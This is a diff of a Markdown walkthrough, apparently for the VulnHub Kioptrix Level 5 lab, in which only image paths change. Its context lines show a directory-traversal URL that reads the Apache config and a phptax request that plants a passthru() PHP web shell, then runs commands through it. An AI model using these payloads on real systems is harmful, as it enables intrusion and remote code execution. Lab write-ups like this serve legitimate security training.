@@ -144,15 +144,15 @@ The scan also found that the target is running FreeBSD.
 
 The website running on port 80 returns a page with the text "It works!". There was nothing else on the page so I decided to take a look at the page source code. On Firefox this can be done using the shortcut `Ctrl + U`.
 
-![[website-1.png|400]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-1.png|400]]
 
 The comment in the source code contained a path: `pChart2.1.3/index.php`
 
-![[website-2.png|500]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-2.png|500]]
 
 This path opened the `pChart` home page.
 
-![[website-7.png|460]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-7.png|460]]
 
 Next, I ran `nikto` and `gobuster` to enumerate details about the website.
 
@@ -162,7 +162,7 @@ nikto -h http://10.6.6.15/pChart2.1.3/ -o nikto.txt
 
 The scan discovered a directory (`/data`) and a `readme.txt` file. The site is also found to be using the outdated version of the `mod_ssl`.
 
-![[website-3.png|640]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-3.png|640]]
 
 ```bash
 gobuster dir --url http://10.6.6.15/pChart2.1.3/ -w /usr/share/wordlists/dirb/common.txt | tee gobuster.txt
@@ -170,15 +170,15 @@ gobuster dir --url http://10.6.6.15/pChart2.1.3/ -w /usr/share/wordlists/dirb/co
 
 The scan found some additional directories but none of them look promising. The `| tee gobuster.txt` command is used to save the output of the command that is used before the `|` symbol to a file while simultaneously outputting it to the terminal.
 
-![[website-4.png|540]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-4.png|540]]
 
 The `/data` path loads a directory listing of the files in the folder.
 
-![[website-5.png|380]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-5.png|380]]
 
 The `readme.txt` file contains details on configuring `pChart`. 
 
-![[website-6.png|400]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-6.png|400]]
 
 ### Port 8080
 
@@ -204,13 +204,13 @@ http://10.6.6.15/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f
 
 `%2f`: URL Encoded (`/`)
 
-![[website-8.png|600]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-8.png|600]]
 
 Using directory traversal vulnerability, I tried to view the content of the Apache configuration file. The config file should contain details on what permissions are required for accessing the website running on port 8080.
 
 FreeBSD stores the Apache config (`httpd.conf`) at `/usr/local/etc/apache22/`.
 
-![[website-11.png|460]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-11.png|460]]
 
 [FreeBSD Install and Configure Apache Web Server - nixCraft](https://www.cyberciti.biz/faq/freebsd-apache-web-server-tutorial/)
 
@@ -218,11 +218,11 @@ FreeBSD stores the Apache config (`httpd.conf`) at `/usr/local/etc/apache22/`.
 http://10.6.6.15/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
 ```
 
-![[website-9.png|600]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-9.png|600]]
 
 Toward the end of the file, the configuration for the website running on port 8080 can be found. The website is configured to only accept requests from a specific "User-Agent".
 
-![[website-10.png|400]]
+![[articles/images/vulnhub-kioptrix-lvl5/website-10.png|400]]
 
 ### Port 8080
 
@@ -254,13 +254,13 @@ I searched online for `phptax` exploits. 2 RCE exploits were available for the a
 
 The above script creates a file on the target that can then be used to execute arbitrary commands. I performed the steps shown in the script manually. The important lines from the code have been highlighted in the image below.
 
-![[exploit-1.png|500]]
+![[articles/images/vulnhub-kioptrix-lvl5/exploit-1.png|500]]
 
 I appended the string that is shown on the 2nd line to the end of the URL for the `phptax` site. The string contains URL-encoded data. `CyberChef` can be used to view the decoded string.
 
 [CyberChef - The Cyber Swiss Army Knife](https://0x1.gitlab.io/code/CyberChef/)
 
-![[exploit-4.png|640]]
+![[articles/images/vulnhub-kioptrix-lvl5/exploit-4.png|640]]
 
 The URL creates a file called `rce.php` on the target. The file will contain the text `<?php passthru($_GET[cmd]);?>`. The `passthru()` function makes it possible to execute system commands using PHP.
 
@@ -272,7 +272,7 @@ http://10.6.6.15:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passth
 
 When the URL is used there will be no change on the webpage.
 
-![[exploit-2.png|640]]
+![[articles/images/vulnhub-kioptrix-lvl5/exploit-2.png|640]]
 
 To test if the `rce.php` file is created, in a new tab I ran the following:
 
@@ -280,7 +280,7 @@ To test if the `rce.php` file is created, in a new tab I ran the following:
 http://10.6.6.15:8080/phptax/data/rce.php?cmd=id
 ```
 
-![[exploit-3.png|460]]
+![[articles/images/vulnhub-kioptrix-lvl5/exploit-3.png|460]]
 
 If you get the result of the `id` command the file was created successfully.
 
